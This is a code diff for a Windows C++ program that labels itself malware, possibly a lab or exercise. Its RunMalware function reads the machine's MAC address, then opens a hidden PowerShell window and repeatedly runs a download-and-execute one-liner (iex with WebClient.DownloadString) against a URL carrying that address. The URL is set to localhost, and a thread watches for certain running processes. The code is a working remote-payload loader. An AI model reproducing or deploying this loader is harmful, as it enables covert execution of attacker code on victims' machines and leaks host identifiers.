@@ -1,18 +1,17 @@
 #include "Header.h"
-#include <stdio.h>
-#pragma warning( disable : 4365 5045 5039)
+#pragma warning( disable : 5039 5045)
 
 #pragma warning( push )
-#pragma warning( disable : 4820 4668 5039 4355 4625 4626 5026 5027 5204 5220)
+#pragma warning( disable : 4820 4668 4365)
+#include <WinSock2.h>
 #include <windows.h>
-#include <Iphlpapi.h>
+#include <iphlpapi.h>
 #include <WtsApi32.h>
-#include <thread>
-#include <future>
+#include <iomanip>
 #pragma warning( pop )
 #include <Psapi.h>
 #include <iostream>
-
+#include <sstream>
 
 
 // Uses 'EnumProcesses', 'OpenProcess', and 'GetModuleBaseName' functions from 'Psapi' library.
@@ -90,27 +89,39 @@ bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const v
 }
 
 
-bool RunMalware(const wstring web_address, const wstring mac_address) {
+bool RunMalware() {
+    wstring mac_address;
+    wstring web_address = L"http://127.0.0.1:80/messageBox.ps1?";
+    if (!GetMacAddress(mac_address)) {
+        printf("Failed to get mac address!");
+        return 1;
+    }
+
     wstring script = L"Add-Type -AssemblyName PresentationFramework\n"
         "iex ((New-Object System.Net.WebClient).DownloadString('" 
         + web_address + L"?macAddress=" + mac_address + L"'))";
     LPCWSTR psScript = script.c_str();
-    bool result = false;
 
-    HINSTANCE hInstance = ShellExecute(NULL, L"open", L"powershell.exe", psScript, NULL, SW_HIDE);
-    if (reinterpret_cast<intptr_t>(hInstance) > 32) {
-        // ShellExecute success
-        result = true;
+    // Execute mallware
+    while (true)
+    {
+        HINSTANCE hInstance = ShellExecute(NULL, L"open", L"powershell.exe", psScript, NULL, SW_HIDE);
+        if (reinterpret_cast<intptr_t>(hInstance) <= 32) {
+            // ShellExecute failed
+            return false;
+        }
+        printf("ok");
+        Sleep(7000);
     }
-    printf("ok");
-    this_thread::sleep_for(chrono::seconds(7));
-    return result;
+
+    return true;
 }
 
 
 DWORD WINAPI ProccessChecker(LPVOID lpParam) {
-    if(lpParam) {}
-    const unordered_set<wstring> target_processes{ L"VsDebugConsol1e.exe", L"slack.exe1" , L"OneDrive.exe1" };
+    (void)lpParam;
+
+    static const unordered_set<wstring> target_processes{ L"VsDebugConsol1e.exe", L"slack.exe1" , L"OneDrive.exe1" };
 
     while (true)
     {
@@ -125,58 +136,55 @@ DWORD WINAPI ProccessChecker(LPVOID lpParam) {
     }
 }
 
-bool GetMacAddress(wstring& mac_address) {
-    PIP_ADAPTER_INFO AdapterInfo;
-    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
 
-    AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
-    if (AdapterInfo == NULL) {
-        printf("Error allocating memory needed to call GetAdaptersinfo\n");
+bool GetMacAddress(wstring& macAddress) {
+    ULONG bufferSize = 0;
+
+    // Get bufferSize
+    DWORD result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufferSize);
+    if (result != ERROR_BUFFER_OVERFLOW) {
+        printf("Failed to get adapter addresses. Error code: %lu\n", result);
         return false;
     }
 
-    // Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
-    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
-        free(AdapterInfo);
-        AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
-        if (AdapterInfo == NULL) {
-            printf("Error allocating memory needed to call GetAdaptersinfo\n");
-            return false;
-        }
+    // Allocate memory for adapter addresses
+    IP_ADAPTER_ADDRESSES* pAddresses = reinterpret_cast<IP_ADAPTER_ADDRESSES*>( HeapAlloc(GetProcessHeap(), 0, bufferSize));
+    if (pAddresses == nullptr) {
+        printf("Error allocating memory needed to call GetAdaptersAddresses\n");
+        return false;
     }
 
-    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) != ERROR_SUCCESS) {
-        free(AdapterInfo);
-        printf("Error to get Adaptersinfo\n");
-        return NULL;
+    // Get adapter addresses
+    result = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAddresses, &bufferSize);
+    if (result != NO_ERROR) {
+        printf("Failed to get adapter addresses. Error code: %lu\n", result);
+        HeapFree(GetProcessHeap(), 0, pAddresses);
+        return false;
     }
-    // Contains pointer to current adapter info
-    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
-    while (pAdapterInfo) {
-        if (!(pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x00 &&
-            pAdapterInfo->Address[2] == 0x00 && pAdapterInfo->Address[3] == 0x00 &&
-            pAdapterInfo->Address[4] == 0x00 && pAdapterInfo->Address[5] == 0x00) &&
-            !(pAdapterInfo->Address[0] == 0xFF && pAdapterInfo->Address[1] == 0xFF &&
-                pAdapterInfo->Address[2] == 0xFF && pAdapterInfo->Address[3] == 0xFF &&
-                pAdapterInfo->Address[4] == 0xFF && pAdapterInfo->Address[5] == 0xFF)) {
-            // MAC address found
 
-            WCHAR mac_addr[18];
-            swprintf_s(mac_addr, L"%02X:%02X:%02X:%02X:%02X:%02X",
-                pAdapterInfo->Address[0], pAdapterInfo->Address[1],
-                pAdapterInfo->Address[2], pAdapterInfo->Address[3],
-                pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
-
-            mac_address = wstring(mac_addr);
-            free(AdapterInfo);
-            return true;
+    // Contains pointer to current adapter addresses
+    IP_ADAPTER_ADDRESSES* pAdapter = pAddresses;
+    while (pAdapter != nullptr) {
+        if (pAdapter->PhysicalAddressLength <= 0) {
+            pAdapter = pAdapter->Next;
+            continue;
         }
 
-        pAdapterInfo = pAdapterInfo->Next;
+        wstringstream ss;
+        for (DWORD i = 0; i < pAdapter->PhysicalAddressLength; i++) {
+            ss << uppercase << hex << setw(2) << setfill(L'0') << static_cast<int>(pAdapter->PhysicalAddress[i]);
+            if (i < pAdapter->PhysicalAddressLength - 1) {
+                ss << L":";
+            }
+        }
+
+        macAddress = ss.str();
+        break;
+
     }
 
-    free(AdapterInfo);
-    return false; // caller must free.
+    HeapFree(GetProcessHeap(), 0, pAddresses);
+    return true;
 }
 
 
@@ -191,19 +199,9 @@ int main(void)
     }
     
     // Every 5 minutes runs the malware
-    wstring mac_address;
-    wstring web_address = L"http://127.0.0.1:80/messageBox.ps1?";
-    if (!GetMacAddress(mac_address)) {
-        printf("Failed to get mac address!");
-        return 1;
-    }
-
-    while (true)
+    if (!RunMalware())
     {
-        if (!RunMalware(web_address, mac_address))
-        {
-            printf("Failed to run malware!");
-        }
+        printf("Failed to run malware!");
     }
 
     return 0;
